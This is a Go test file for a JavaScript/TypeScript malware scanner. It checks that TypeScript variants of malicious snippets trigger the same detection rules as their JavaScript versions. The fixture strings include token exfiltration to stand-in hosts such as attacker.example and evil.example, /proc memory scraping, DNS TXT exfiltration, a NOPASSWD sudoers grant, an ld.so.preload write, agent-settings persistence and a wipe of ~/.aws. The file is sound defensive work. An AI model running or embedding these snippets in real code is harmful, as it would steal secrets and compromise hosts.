package jsrisk

import (
	"strings"
	"testing"

	"github.com/garagon/aguara/internal/types"
)

var typeScriptExtensions = []string{".ts", ".mts", ".cts"}

// Each case pairs an input from the JavaScript tests in this package with the
// same behavior written as TypeScript: type annotations, generics, `as`
// casts, decorators, `import type`, template literal types and non-null
// assertions. The TypeScript form must produce the same rule at the same
// severity under every routed TypeScript extension.
func TestTypeScriptMatchesJavaScriptDetections(t *testing.T) {
	cases := []struct {
		name string
		rule string
		js   string
		ts   string
	}{
		{
			name: "obfuscator shape with typed declarations",
			rule: RuleObfuscation,
			js:   strings.Repeat("var _0xabcd=1;", 200) + "\nwhile(!![]){console.log('a');}\n",
			ts:   strings.Repeat("let _0xabcd: number = 1;", 200) + "\nwhile(!![]){console.log('a' as string);}\n",
		},
		{
			name: "detached daemon with import type and as cast",
			rule: RuleDaemon,
			js: `
const cp = require('child_process');
const child = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
child.unref();
`,
			ts: `
import type { ChildProcess, SpawnOptions } from 'child_process';
import * as cp from 'child_process';

const child: ChildProcess = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' } as SpawnOptions);
child.unref();
`,
		},
		{
			name: "CI secret read reaching fetch through a generic wrapper",
			rule: RuleCISecretHarvest,
			js: `
const t = process.env.GITHUB_TOKEN;
fetch('https://attacker.example/exfil', {method:'POST', body: t});
`,
			ts: `
interface Envelope<T> { value: T }
const t: string = process.env.GITHUB_TOKEN as string;
const body: Envelope<string> = { value: t! };
await fetch('https://attacker.example/exfil', { method: 'POST', body: JSON.stringify(body) } as RequestInit);
`,
		},
		{
			name: "runner process memory with a template literal path",
			rule: RuleProcMemOIDC,
			js: `
const fs = require('fs');
const dir = fs.readdirSync('/proc');
for (const pid of dir) {
  const mem = fs.readFileSync('/proc/' + pid + '/mem');
  if (mem.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN)) {
    fetch('https://attacker/x', {method:'POST', body: mem});
  }
}
`,
			ts: `
import * as fs from 'fs';
const dir: string[] = fs.readdirSync('/proc');
for (const pid of dir) {
  const mem: Buffer = fs.readFileSync('/proc/' + pid + '/mem');
  if (mem.includes(process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN as string)) {
    await fetch('https://attacker/x', { method: 'POST', body: mem });
  }
}
`,
		},
		{
			name: "agent settings write inside a decorated class",
			rule: RuleAgentPersistence,
			js: `
const fs = require('fs');
fs.writeFileSync(process.env.HOME + '/.claude/settings.json', '{"hooks":{}}');
`,
			ts: `
import { writeFileSync } from 'fs';

function Init(): ClassDecorator { return () => {}; }

@Init()
export class Setup {
  run(home: string = process.env.HOME!): void {
    writeFileSync(home + '/.claude/settings.json', '{"hooks":{}}');
  }
}
`,
		},
		{
			name: "DNS TXT exfil chain with typed callback",
			rule: RuleDNSTXTExfil,
			js: `
const dns = require('dns');
const cp = require('child_process');
const fs = require('fs');
const os = require('os');
const t = process.env.GITHUB_TOKEN;
fs.writeFileSync(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
const archive = os.tmpdir() + '/nt-stage.tar.gz';
const ch = cp.fork('./payload.cjs', [], {detached: true, stdio: 'ignore'}); ch.unref();
dns.resolveTxt('xh.' + Date.now() + '.bt.node.js', (err, rec) => {});
`,
			ts: `
import * as dns from 'dns';
import * as cp from 'child_process';
import * as fs from 'fs';
import * as os from 'os';
import type { Resolver } from 'dns';

type Zone = ` + "`xh.${number}.bt.node.js`" + `;
const t: string = process.env.GITHUB_TOKEN as string;
fs.writeFileSync(os.tmpdir() + '/envs.txt', JSON.stringify(process.env));
const archive: string = os.tmpdir() + '/nt-stage.tar.gz';
const ch = cp.fork('./payload.cjs', [], { detached: true, stdio: 'ignore' }); ch.unref();
dns.resolveTxt(('xh.' + Date.now() + '.bt.node.js') as Zone, (err: Error | null, rec: string[][]) => {});
`,
		},
		{
			name: "Bun second stage with a typed secret read",
			rule: RuleBunSecondStage,
			js: `const cp = require('child_process');
cp.spawn('bun', ['./x.mjs']);
const t = process.env.GITHUB_TOKEN;
fetch('https://evil.example/c', { method: 'POST', body: t });`,
			ts: `import { spawn } from 'child_process';
spawn('bun', ['./x.mjs']);
const t: string | undefined = process.env.GITHUB_TOKEN;
await fetch('https://evil.example/c', { method: 'POST', body: t as string });`,
		},
		{
			name: "GitHub write channel with a non-null secret read",
			rule: RuleGitHubC2,
			js:   "const t = process.env.NPM_TOKEN;\nconst q = 'mutation { createGist(input:{}) { url } }';\nfetch('https://api.github.com/graphql', { method:'POST', body: q });\n",
			ts:   "const t: string = process.env.NPM_TOKEN!;\nconst q: string = 'mutation { createGist(input:{}) { url } }';\nawait fetch('https://api.github.com/graphql', { method: 'POST', body: q } as RequestInit);\n",
		},
		{
			name: "sudoers grant through a typed fs import",
			rule: RuleSudoersTamper,
			js:   "const fs = require('fs');\nfs.appendFileSync('/etc/sudoers.d/miasma', 'user ALL=(ALL) NOPASSWD:ALL');\n",
			ts:   "import * as fs from 'fs';\nconst mode: number = 0o440;\nfs.appendFileSync('/etc/sudoers.d/miasma', 'user ALL=(ALL) NOPASSWD:ALL' as string, { mode } as fs.WriteFileOptions);\n",
		},
		{
			name: "loader preload write through a named import",
			rule: RuleHostTrustTamper,
			js:   "const fs = require('fs');\nfs.writeFileSync('/etc/ld.so.preload', '/tmp/libx.so');\n",
			ts:   "import { writeFileSync } from 'fs';\nconst lib: `/tmp/${string}.so` = '/tmp/libx.so';\nwriteFileSync('/etc/ld.so.preload', lib);\n",
		},
		{
			name: "credential directory wipe with typed options",
			rule: RuleWiperTripwire,
			js:   "const fs = require('fs');\nfs.rmSync('/home/user/.aws', { recursive: true, force: true });\n",
			ts:   "import * as fs from 'fs';\nconst target: string = '/home/user/.aws';\nfs.rmSync('/home/user/.aws', { recursive: true, force: true });\n",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			want := findRule(analyze(t, "case.js", tc.js), tc.rule)
			if want == nil {
				t.Fatalf("JavaScript input no longer produces %s; update the case", tc.rule)
			}
			for _, ext := range typeScriptExtensions {
				got := findRule(analyze(t, "case"+ext, tc.ts), tc.rule)
				if got == nil {
					t.Fatalf("%s: expected %s on TypeScript input", ext, tc.rule)
				}
				if got.Severity != want.Severity {
					t.Errorf("%s: severity %v, want %v (JavaScript)", ext, got.Severity, want.Severity)
				}
			}
		})
	}
}

// TypeScript `import x = require('m')` binds a module exactly like
// `const x = require('m')`.
func TestTypeScriptImportEqualsRequireBindsModules(t *testing.T) {
	cases := []struct {
		name, content, rule string
	}{
		{
			name: "child_process",
			content: `import cp = require('child_process');
const child = cp.spawn('node', ['./payload.js'], { detached: true, stdio: 'ignore' });
child.unref();
`,
			rule: RuleDaemon,
		},
		{
			name:    "fs",
			content: "import fs = require('fs');\nfs.appendFileSync('/etc/sudoers.d/miasma', 'user ALL=(ALL) NOPASSWD:ALL');\n",
			rule:    RuleSudoersTamper,
		},
		{
			name:    "exported https alias",
			content: "export import https = require('https');\nconst t = process.env.NPM_TOKEN;\nhttps.request({ hostname: 'x.example', method: 'POST' }).end(t);\n",
			rule:    RuleCISecretHarvest,
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if !hasRule(analyze(t, "binding.ts", tc.content), tc.rule) {
				t.Fatalf("expected %s for import-equals binding", tc.rule)
			}
		})
	}
}

// Type arguments between a client call and its arguments do not hide the
// network sink.
func TestTypeScriptGenericCallTypeArgumentsAreNetworkSinks(t *testing.T) {
	cases := []string{
		"const t = process.env.NPM_TOKEN as string;\nawait fetch<Response>('https://x.example', { method: 'POST', body: t });\n",
		"import axios from 'axios';\nconst t = process.env.NPM_TOKEN;\nawait axios.post<Reply<string>>('https://x.example', { t });\n",
		"import * as https from 'https';\nconst t = process.env.NPM_TOKEN;\nhttps.request<Options>({ hostname: 'x.example', method: 'POST' }).end(t);\n",
	}
	for _, content := range cases {
		if !hasRule(analyze(t, "client.ts", content), RuleCISecretHarvest) {
			t.Errorf("expected JS_CI_SECRET_HARVEST_001 for %q", content)
		}
	}
}

// Documented limit: the wiper detector reads a literal path argument and a
// literal options object. A TypeScript cast on either (`'/x' as string`,
// `{ recursive: true } as RmOptions`) or an angle-bracket assertion makes the
// argument non-literal, so the wipe is missed. This is a missed detection,
// never a false positive; the test pins the behavior so a future change to
// argument parsing updates it deliberately.
func TestTypeScriptCastWiperArgumentsAreAKnownLimit(t *testing.T) {
	content := "import * as fs from 'fs';\nfs.rmSync('/home/user/.aws', { recursive: true, force: true } as fs.RmOptions);\n"
	if hasRule(analyze(t, "wipe.ts", content), RuleWiperTripwire) {
		t.Fatal("cast options are now understood; update the documented limit")
	}
}

// A postfix non-null assertion before a division must not open a regex
// literal: the masked region would otherwise run to the next slash and hide
// or invent code.
func TestTypeScriptNonNullDivisionKeepsLexerAligned(t *testing.T) {
	content := `import * as fs from 'fs';
declare const total: number | undefined;
declare const counts: number[];
const ratio = total! / counts[0]! / scale()! / 2;
fs.appendFileSync('/etc/sudoers.d/miasma', 'user ALL=(ALL) NOPASSWD:ALL');
`
	f := findRule(analyze(t, "ratio.ts", content), RuleSudoersTamper)
	if f == nil {
		t.Fatal("expected JS_SUDOERS_TAMPER_001 after a non-null division")
	}
	if f.Severity != types.SeverityCritical {
		t.Errorf("severity %v, want CRITICAL", f.Severity)
	}
}

func TestBangBeforeSlashClassification(t *testing.T) {
	cases := []struct {
		src   string
		regex bool
	}{
		{"x = !/re/.test(s)", true},
		{"if (!/re/.test(s)) {}", true},
		{"return!/re/.test(s)", true},
		{"if(x)!/re/.test(s)", true},
		{"a &&\n!/re/.test(s)", true},
		{"y = a! / b", false},
		{"y = xs[0]! / b", false},
		{"y = f()! / b", false},
		{"y = Total! / b", false},
	}
	for _, tc := range cases {
		slash := strings.LastIndex(tc.src[:strings.Index(tc.src, "/")+1], "/")
		if got := couldBeRegexStart([]byte(tc.src), slash); got != tc.regex {
			t.Errorf("couldBeRegexStart(%q) = %v, want %v", tc.src, got, tc.regex)
		}
	}
}

// Ordinary TypeScript source: an MCP-style server with typed imports,
// decorators, generics, enums, template literal types, `as const`,
// non-null divisions and child_process usage that is not daemonized. None
// of the jsrisk chains apply, so it must stay clean on every extension.
func TestTypeScriptOrdinarySourceStaysClean(t *testing.T) {
	sources := map[string]string{
		"server": `import { McpServer } from '@modelcontextprotocol/sdk/server/mcp.js';
import { z } from 'zod';
import type { ChildProcess, SpawnOptions } from 'node:child_process';
import { spawn } from 'node:child_process';
import * as fs from 'node:fs/promises';
import * as path from 'node:path';
import * as os from 'node:os';

export enum Mode { Read = 'read', Write = 'write' }
type Route = ` + "`/api/${string}`" + `;
const ROUTES = ['/api/files', '/api/status'] as const satisfies readonly Route[];

function Injectable(): ClassDecorator { return () => {}; }

@Injectable()
export class FileService<T extends { id: string }> {
  private readonly cache = new Map<string, T>();
  constructor(private readonly root: string, private readonly limit?: number) {}

  ratio(used: number | undefined): number {
    return used! / this.limit! / 100;
  }

  async read(rel: string): Promise<string> {
    const full = path.resolve(this.root, rel);
    if (!full.startsWith(this.root)) throw new Error('outside root');
    return fs.readFile(full, 'utf8');
  }

  async clean(): Promise<void> {
    await fs.rm(path.join(os.tmpdir(), 'file-service-cache'), { recursive: true, force: true });
  }

  run(args: string[]): ChildProcess {
    const options: SpawnOptions = { stdio: 'inherit', cwd: this.root };
    return spawn('git', ['status', ...args], options);
  }
}

const server = new McpServer({ name: 'files', version: '1.0.0' });
server.tool('read', { path: z.string() }, async ({ path: rel }: { path: string }) => ({
  content: [{ type: 'text' as const, text: await new FileService(process.cwd()).read(rel) }],
}));
const re = /^\/api\/(files|status)$/;
const isApi = (p: string): boolean => !/^\/internal/.test(p) && re.test(p);
`,
		"declarations": `declare module 'child_process' {
  interface SpawnOptions { detached?: boolean; stdio?: 'ignore' | 'inherit' | 'pipe' }
}
export declare function spawnDetached(cmd: string, opts: { detached: true; stdio: 'ignore' }): void;
export type Env = { GITHUB_TOKEN?: string; NPM_TOKEN?: string };
`,
	}
	for name, src := range sources {
		for _, ext := range typeScriptExtensions {
			if findings := analyze(t, name+ext, src); len(findings) != 0 {
				t.Errorf("%s%s: expected no findings, got %+v", name, ext, findings)
			}
		}
	}
}
